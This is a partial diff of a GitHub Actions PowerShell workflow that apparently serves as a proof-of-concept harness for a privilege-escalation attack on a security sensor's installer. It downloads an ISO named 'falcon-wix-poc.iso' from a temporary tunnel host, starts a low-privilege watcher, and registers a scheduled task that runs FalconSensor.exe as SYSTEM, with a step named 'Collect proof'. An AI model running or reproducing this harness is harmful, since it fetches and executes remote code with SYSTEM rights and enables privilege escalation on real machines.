@@ -12,7 +12,7 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'http://mcqxi-3-91-37-226.run.pinggy-free.link:34571/falcon-wix-poc.iso'
+          $u = 'http://qsxzc-2600-1f18-68f7-2200-4028-a48c-c2-27bc.run.pinggy-free.link:40807/falcon-wix-poc.iso'
           Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
           $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
@@ -40,10 +40,10 @@ jobs:
           Write-Host "Started low watcher PID=$($low.Id)"
           Start-Sleep -Seconds 3
           $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
-          $sysAction=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c "set > C:\poc\results\system-env.txt & C:\poc\readonly\FalconSensor.exe /layout C:\poc\layout /quiet"'
+          $sysAction=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c "set > C:\poc\results\system-env.txt & C:\poc\readonly\FalconSensor.exe"'
           Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
           Start-ScheduledTask -TaskName BurnSystemInstaller
-          Start-Sleep -Seconds 90
+          Start-Sleep -Seconds 45
           exit 0
       - name: Collect proof
         if: always()
